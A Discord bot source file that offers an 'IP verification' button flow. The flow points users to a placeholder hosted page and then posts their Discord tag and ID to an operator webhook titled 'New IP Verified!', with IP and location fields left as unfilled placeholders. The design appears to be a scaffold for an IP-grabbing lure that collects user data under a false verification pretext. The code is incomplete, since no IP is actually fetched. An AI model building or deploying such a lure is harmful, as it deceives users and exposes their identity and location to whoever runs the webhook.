const { Client, GatewayIntentBits, Collection, Events, ButtonBuilder, ButtonStyle, ActionRowBuilder, EmbedBuilder, WebhookClient } = require('discord.js');
require('dotenv').config();

const client = new Client({ 
    intents: [GatewayIntentBits.Guilds] 
});

client.commands = new Collection();

// Slash Command: /verify
client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'verify') {
        const button = new ButtonBuilder()
            .setCustomId('verify_ip')
            .setLabel('Verify IP Address')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('🔍');

        const row = new ActionRowBuilder().addComponents(button);

        await interaction.reply({
            content: 'Click the button below to verify your IP address.',
            components: [row],
            ephemeral: true
        });
    }
});

// Button Interaction
client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'verify_ip') {
        await interaction.deferReply({ ephemeral: true });

        const embed = new EmbedBuilder()
            .setTitle('🔍 IP Verification')
            .setDescription('Redirecting you to verify your IP address...')
            .setColor(0x0099FF)
            .setFooter({ text: 'Click the button to continue' })
            .setURL('https://your-domain.com'); // REPLACE WITH YOUR HOSTED URL

        const button = new ButtonBuilder()
            .setCustomId('confirm_ip')
            .setLabel('Confirm')
            .setStyle(ButtonStyle.Success)
            .setEmoji('✅');

        const row = new ActionRowBuilder().addComponents(button);

        await interaction.editReply({
            embeds: [embed],
            components: [row]
        });
    }

    if (interaction.customId === 'confirm_ip') {
        await interaction.deferReply({ ephemeral: true });

        const webhookEmbed = new EmbedBuilder()
            .setTitle('🆕 New IP Verified!')
            .setColor(0x00FF00)
            .addFields(
                { name: 'User', value: `${interaction.user.tag} (${interaction.user.id})`, inline: true },
                { name: 'IP Address', value: 'Fetching...', inline: true },
                { name: 'Location', value: 'Fetching...', inline: true }
            );

        const webhookClient = new WebhookClient({ url: process.env.WEBHOOK_URL });
        await webhookClient.send({ embeds: [webhookEmbed] });

        await interaction.editReply({
            content: '✅ IP Verified Successfully!',
            embeds: [],
            components: []
        });
    }
});

client.once(Events.ClientReady, () => {
    console.log(`Logged in as ${client.user.tag}`);
});

client.login(process.env.TOKEN);
